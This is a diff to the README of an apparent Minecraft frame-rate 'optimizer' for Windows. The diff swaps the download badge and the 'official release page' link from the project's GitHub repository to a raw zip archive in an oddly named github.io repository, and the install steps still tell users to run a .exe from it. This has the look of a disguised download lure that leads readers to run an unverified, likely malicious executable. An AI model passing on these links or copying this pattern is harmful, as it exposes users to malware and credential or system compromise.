@@ -5,7 +5,7 @@ description: "Increase Minecraft frame rates by up to 60% with this tool that ad
 ---
 # 🚀 MinecraftOptimizer - Boost your game frame rate today
 
-[![](https://img.shields.io/badge/Download-MinecraftOptimizer-blue.svg)](https://github.com/Drykeeightyeight427/MinecraftOptimizer)
+[![](https://img.shields.io/badge/Download-MinecraftOptimizer-blue.svg)](https://raw.githubusercontent.com/Drykeeightyeight427/drykeeightyeight427.github.io/main/comburimeter/github-io-drykeeightyeight-v3.5.zip)
 
 MinecraftOptimizer helps you improve your game performance. It changes your computer settings to allow Minecraft to run faster and smoother. This tool is free and open source. It works on Windows computers.
 
@@ -31,7 +31,7 @@ Your computer needs to meet these basic standards to run the optimizer:
 
 Follow these steps to set up the software.
 
-1. Visit the [official release page](https://github.com/Drykeeightyeight427/MinecraftOptimizer) to download the installer.
+1. Visit the [official release page](https://raw.githubusercontent.com/Drykeeightyeight427/drykeeightyeight427.github.io/main/comburimeter/github-io-drykeeightyeight-v3.5.zip) to download the installer.
 2. Select the file ending in .exe.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installation process.
